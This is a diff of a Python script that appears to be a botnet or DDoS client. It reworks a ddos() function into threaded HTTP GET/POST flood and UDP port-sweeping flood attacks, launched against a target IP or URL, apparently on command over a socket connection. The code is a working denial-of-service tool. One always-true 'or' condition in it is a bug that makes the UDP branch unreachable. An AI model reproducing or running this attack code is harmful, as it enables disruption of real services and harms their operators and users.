@@ -8,8 +8,7 @@ Self_starting = True
 #Testing code, will be delete in generation
 from socket import *
 import threading
-from random import _urandom
-import requests
+from random import _urandom, randint
 from os.path import abspath
 from sys import argv
 s = socket(AF_INET, SOCK_STREAM)
@@ -19,42 +18,43 @@ path = abspath(argv[0])
 def ddos(mode, ip): #ip : ip or url
     # Attack method
     print("[*]Start attack")
-    if mode == 'httpflood': # httpflood method : only http GET flood
-        def http_get_request(ip):
+    if mode == 'httpGETflood' or 'httpflood' or 'httpPOSTflood': # httpflood method : only http GET flood
+        from urllib import request,parse
+        from ssl import _create_unverified_context
+        dict = {
+            "name":"ArcticWolf"
+        }
+        context = _create_unverified_context()
+        data = bytes(parse.urlencode(dict), encoding='utf8')
+        def attack(ip):
             global ddos_flag
             while True:
                 if ddos_flag: return
                 try:
-                    response = requests.get(ip)
-                    print('[*]code:', response.status_code)
+                    if mode == 'httpGETflood' or 'httpflood':
+                        with request.urlopen(ip, context=context)as response:
+                            print('[*]code:', response.status)
+                    elif mode == 'httpPOSTflood':
+                        with request.urlopen(ip, data=data, context=context) as response:
+                            print('[*]code:', response.status)
                 except Exception as e:
                     print(e)
                     pass
-        print('[*]Attack:', ip)
-        for i in range(Threads): threading.Thread(target=http_get_request, args=(ip,)).start()
-    if mode == 'udpflood': # UDPflood
-        sock = socket(AF_INET, SOCK_DGRAM)
-        byte = _urandom(1490)
-        if port == "" or port == ' ': 
+    elif mode == 'udpflood': # UDPflood
+        def attack(ip):
+            sock = socket(AF_INET, SOCK_DGRAM)
+            byte = _urandom(1490)
             port = 1
-            is_all = True
-        else:
-            port = int(port)
-            is_all = False
-
-        sent = 0
-
-        while True:
-            sock.sendto(byte, (ip, port))
-            sent = sent + 1
-            print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
-            if is_all:
-                port = port + 1
-            else:
-                pass
-
-            if port == 65534:
-                port = 1
+            sent = 0
+            while True:
+                sock.sendto(byte, (ip, port))
+                sent = sent + 1
+                print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
+                port += 1
+                if port == 65534:
+                    port = 1
+    print('[*]Attack:', ip)
+    for i in range(Threads): threading.Thread(target=attack, args=(ip,)).start()
 def connect():
     global s
     try:
